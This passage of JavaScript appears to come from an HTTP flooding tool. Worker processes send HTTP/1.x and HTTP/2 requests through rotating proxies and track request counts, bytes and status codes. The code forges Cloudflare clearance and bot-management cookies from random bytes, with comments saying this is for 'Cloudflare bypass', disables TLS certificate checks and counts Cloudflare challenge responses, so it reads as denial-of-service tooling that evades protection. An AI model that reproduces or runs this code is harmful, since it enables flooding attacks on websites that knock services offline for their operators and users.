          workerStats.statusCodes['h2_req_error'] = (workerStats.statusCodes['h2_req_error'] || 0) + 1;
          
          try { client.close(); } catch (e) {}
        });
        
        // Track bytes sent for headers
        const headerSize = Buffer.from(Object.entries(headers).map(([k,v]) => `${k}: ${v}`).join('\r\n')).length;
        workerStats.bytesSent += headerSize;
        
        // End the request - most will be GET
        if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
          // Send payload for methods that require it
          const payload = payloadData || `data=${Date.now()}`;
          req.write(payload);
          workerStats.bytesSent += Buffer.from(payload).length;
        }
        
        req.end();
        
      } catch (requestError) {
        if (options.verbose) {
          console.error(`[HTTP/2] Request creation error: ${requestError.message}`);
        }
        
        workerStats.failed++;
        workerStats.requests++;
        workerStats.statusCodes['h2_req_create'] = (workerStats.statusCodes['h2_req_create'] || 0) + 1;
        
        try { client.close(); } catch (e) {}
      }
    } catch (error) {
      // Fallback/fatal error
      if (options.verbose) {
        console.error(`[HTTP/2] Fatal error: ${error.message}`);
      }
      
      workerStats.failed++;
      workerStats.requests++;
      workerStats.statusCodes['h2_fatal'] = (workerStats.statusCodes['h2_fatal'] || 0) + 1;
    }
  }

  // Update the main performRequest function to handle HTTP/2 failures properly
  function performRequest(targetUrl) {
    try {
      const urlToUse = targetUrl || options.target;
      // Parse the URL
      const parsedUrl = new URL(urlToUse);
      const requestOptions = createRequestOptions(urlToUse);
      
      // Generate necessary tokens and cookies for Cloudflare bypass
      const timestamp = Date.now();
      const randomToken = crypto.randomBytes(16).toString('hex');
      const cfClearance = Buffer.from(`${timestamp}|${randomToken}|0|${parsedUrl.hostname}`).toString('base64').replace(/=/g, '');
      
      // Add essential Cloudflare cookies
      const cookies = [
        `cf_clearance=${cfClearance}`,
        `__cf_bm=${crypto.randomBytes(32).toString('hex')}`,
        `__cflb=${crypto.randomBytes(8).toString('hex')}`,
        `__cfruid=${crypto.randomBytes(16).toString('hex')}`
      ];
      
      // Add the cookies to the request
      requestOptions.headers['Cookie'] = (requestOptions.headers['Cookie'] || '') + (requestOptions.headers['Cookie'] ? '; ' : '') + cookies.join('; ');
      
      // Choose the appropriate protocol implementation - STRICTLY based on options.protocol
      if (options.protocol === 'http2') {
        // Use our dedicated HTTP/2 implementation - NO FALLBACK
        performHttp2Request(parsedUrl, requestOptions);
      } else {
        // HTTP/1.0 or HTTP/1.1 implementation
        performHttp1Request(parsedUrl, requestOptions);
      }
    } catch (error) {
      if (options.verbose) {
        console.error(`Request initialization error: ${error.message}`);
      }
      workerStats.failed++;
      workerStats.requests++;
      workerStats.statusCodes['init_error'] = (workerStats.statusCodes['init_error'] || 0) + 1;
    }
  }

  // Extract HTTP/1.x implementation to a separate function
  function performHttp1Request(parsedUrl, requestOptions) {
    try {
      if (options.verbose) console.log('Performing HTTP/1.x request...');
      const protocol = parsedUrl.protocol === 'https:' ? https : http;
      
      // Set HTTP version based on protocol option
      requestOptions.protocol = parsedUrl.protocol;
      if (options.protocol === 'http1.0') {
        if (options.verbose) console.log('Setting up for HTTP/1.0...');
        requestOptions.headers['Connection'] = 'close';
        requestOptions._defaultAgent = null;
        requestOptions.httpVersionMajor = 1;
        requestOptions.httpVersionMinor = 0;
      } else {
        if (options.verbose) console.log('Setting up for HTTP/1.1...');
        requestOptions.httpVersionMajor = 1;
        requestOptions.httpVersionMinor = 1;
        if (options.keepAlive) {
          requestOptions.headers['Connection'] = 'keep-alive';
        } else {
          requestOptions.headers['Connection'] = 'close';
        }
      }
      
      if (options.verbose) console.log('Checking for proxy...');
      const proxyToUse = options.proxy || getNextProxy();
      if (proxyToUse) {
        if (options.verbose) console.log(`Using proxy: ${proxyToUse}`);
        const [proxyHost, proxyPort] = proxyToUse.split(':');
        let proxyAuth = null;
        let actualProxyHost = proxyHost;
        
        if (proxyHost.includes('@')) {
          const [auth, host] = proxyHost.split('@');
          proxyAuth = auth;
          actualProxyHost = host;
        }
        
        if (parsedUrl.protocol === 'https:') {
          if (options.verbose) console.log('Setting up HTTPS-over-HTTP tunnel agent...');
          requestOptions.agent = tunnel.httpsOverHttp({
            proxy: {
              host: actualProxyHost,
              port: parseInt(proxyPort, 10),
              proxyAuth: proxyAuth
            },
            rejectUnauthorized: false
          });
        } else {
          if (options.verbose) console.log('Setting up direct HTTP proxy...');
          requestOptions.hostname = actualProxyHost;
          requestOptions.port = parseInt(proxyPort, 10);
          requestOptions.path = parsedUrl.href;
          
          if (proxyAuth) {
            requestOptions.headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxyAuth).toString('base64');
          }
        }
      }
      
      if (options.verbose) console.log(`Making HTTP/1.${options.protocol === 'http1.0' ? '0' : '1'} request to ${parsedUrl.href}...`);
      const request = protocol.request(requestOptions, (response) => {
        const statusCode = response.statusCode;
        workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
        
        const isCloudflareCaptcha = response.headers['server'] === 'cloudflare' && 
                                   (statusCode === 403 || statusCode === 503) &&
                                   (response.headers['cf-chl-bypass'] || response.headers['cf-ray']);
        
        if (isCloudflareCaptcha) {
          workerStats.statusCodes['cf_challenge'] = (workerStats.statusCodes['cf_challenge'] || 0) + 1;
        }
        
        if (statusCode >= 200 && statusCode < 400) {
          workerStats.successful++;
        } else {
          workerStats.failed++;
        }
        
        if (options.followRedirects && [301, 302, 303, 307, 308].includes(statusCode)) {
          const location = response.headers.location;
          if (location) {
            try {
              const redirectUrl = new URL(location, parsedUrl.href);
              if (options.verbose) {
                console.log(`Following redirect to: ${redirectUrl.href}`);
              }
              performRequest(redirectUrl.href);
            } catch (e) {
              if (options.verbose) {
                console.error(`Failed to follow redirect: ${e.message}`);
              }
              workerStats.failed++;
            }
            workerStats.requests++;
            return;
          }
        }
        
        let responseData = Buffer.alloc(0);
        response.on('data', (chunk) => {
          responseData = Buffer.concat([responseData, chunk]);
          workerStats.bytesReceived += chunk.length;
        });
        
        response.on('end', () => {
          workerStats.requests++;
          
          if (options.verbose) {
            const setCookieHeader = response.headers['set-cookie'];
            if (setCookieHeader) {
              console.log(`Received cookies: ${setCookieHeader}`);
            }
          }
        });
      });
      
      request.on('error', (err) => {
        if (options.verbose) {
          console.error(`HTTP/1.${options.protocol === 'http1.0' ? '0' : '1'} request error: ${err.message}`);
        }
        workerStats.failed++;
        workerStats.requests++;
        workerStats.statusCodes[`http1_error`] = (workerStats.statusCodes[`http1_error`] || 0) + 1;
      });
      
      request.setTimeout(options.timeout || 10000, () => {
        request.destroy();
        workerStats.failed++;
        workerStats.requests++;
        workerStats.statusCodes['timeout'] = (workerStats.statusCodes['timeout'] || 0) + 1;
      });
      
      if (['POST', 'PUT', 'PATCH'].includes(options.method)) {
        if (payloadData) {
          const buffer = Buffer.from(payloadData);
          workerStats.bytesSent += buffer.length;
          request.write(buffer);
        } else if (options.method !== 'GET') {
          const defaultPayload = `data=${Date.now()}`;
          const buffer = Buffer.from(defaultPayload);
          workerStats.bytesSent += buffer.length;
          request.write(buffer);
        }
      }
      
      if (options.verbose) console.log('Ending request...');
      request.end();
      if (options.verbose) console.log('Request ended.');
    } catch (error) {
      process.send({ type: 'error', data: { message: error.message, stack: error.stack } });
      workerStats.failed++;
      workerStats.requests++;
      workerStats.statusCodes[`http1_setup_error`] = (workerStats.statusCodes[`http1_setup_error`] || 0) + 1;
    }
  }
}